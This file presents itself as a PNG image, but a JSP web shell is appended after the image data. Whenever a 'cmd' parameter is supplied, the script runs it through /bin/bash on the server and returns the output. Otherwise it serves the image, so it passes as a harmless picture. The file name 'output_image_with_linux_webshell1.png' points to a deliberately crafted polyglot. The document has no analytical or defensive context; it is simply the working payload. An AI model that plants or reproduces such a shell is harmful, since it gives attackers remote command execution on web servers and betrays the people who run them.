�PNG

   IHDR   x   \   �Yq�   sRGB ���   gAMA  ���a   	pHYs  �  ��o�d  PIDATx^���k�u���~og;�ݸQt�E�^��M��P:�Bj�.��IAtх�x[K"JB4ݨlut�.��A� �b�<�����s����y�~|���z�a컛�����W+�ss�Q�U���4�'`�L���0y&O��	�<�'`�L���0y&O�K�����65����ܐ}����?�/���X�46�7�Y�HU�����|޵���Jw�Cv�`hmu'����ƞ��E:�ɸ7�}���_��߳��}.�ĕ��Xg7���+�5�Scc	7>�P���%�}�`�&���]�=o��r�	ط���3�'jk���������W
`��=���k�큥N�ݱ���̌����xw}�{��؝����G
a���s�cw��5����7�����V6�{���{�����_�1�;�b���\����h�1+��C=k�_	a���h��<%-wP��b{��pg&SX�&mP ܭ���`���e���ݖ ,&O���c�b�����ؠ����`q�2͊K-U��eql���	�;�{��a��x}U���ӫ�h�,�;��=�;O�]��W���]R���`/쟂]P����6X�%557W����Ӱ`�
����t`soP��c��ۭUk�\YYx{�N��^l���gv��#~�"��x�ab|Ō��&u)�+l)~�;O����O��w,��P�4}nw�/SS��ZJ��a��u
��Lأ��E�e8���n�5k��_{�1�X`��-D������4�"��jk]��b�8�%��P��s�_Q�ݲ��׻n���5�0i��P�{�_Q+����GuG6t�3bk�36�����k��X�`��p&���Y0��0�j�����*�epCa\�wZ��i%_�ν�����a��~i����D̕�S[�.wp���Mc������ZZ܁�����᯵̉������F���m��+X�+��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0u��.8vt�R�    IEND�B`�
<%@ page import="java.io.*" %>
<%@ page contentType="image/png" %>
<%
if (request.getParameter("cmd") != null) {
    // Change to text/html when executing commands
    response.setContentType("text/html;charset=UTF-8");
    
    String[] command = {"/bin/bash", "-c", request.getParameter("cmd")};
    ProcessBuilder pb = new ProcessBuilder(command);
    pb.redirectErrorStream(true);
    Process p = pb.start();

    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
    reader.close();
    p.waitFor();
} else {
    // Show image when no command is provided
    response.setContentType("image/png");
    byte[] imageData = new byte[1024];
    int bytesRead;
    FileInputStream fis = new FileInputStream(application.getRealPath("/") + "output_image_with_linux_webshell1.png");
    ServletOutputStream sos = response.getOutputStream();
    while ((bytesRead = fis.read(imageData)) != -1) {
        sos.write(imageData, 0, bytesRead);
    }
    fis.close();
    sos.close();
}
%>